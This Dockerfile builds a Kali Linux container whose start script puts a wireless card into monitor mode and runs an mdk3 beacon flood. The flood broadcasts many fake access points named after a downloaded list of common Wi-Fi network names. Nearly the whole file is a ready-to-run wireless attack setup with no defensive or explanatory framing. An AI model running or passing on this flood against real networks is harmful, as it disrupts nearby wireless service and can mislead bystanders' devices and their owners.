FROM kalilinux/kali-linux-docker
MAINTAINER txt3rob@gmail.com

RUN echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" > /etc/apt/sources.list && \
echo "deb-src http://http.kali.org/kali kali-rolling main contrib non-free" >> /etc/apt/sources.list
ENV DEBIAN_FRONTEND noninteractive
RUN apt-get -y update && apt-get -y dist-upgrade && apt-get clean
RUN apt-get install mdk3 ca-certificates -y
RUN wget https://gist.githubusercontent.com/jgamblin/da795e571fb5f91f9e86a27f2c2f626f/raw/0e5e53b97e372a21cb20513d5064fde11aed844c/commonssids.txt
RUN echo "#!/bin/bash" >> /start.sh
RUN echo "airmon-ng start wlan0" >> /start.sh
RUN echo "mdk3 wlan0mon b -f commonssids.txt -g -t -m -s 1000" >> /start.sh
RUN iwconfig
CMD ["/bin/bash"]
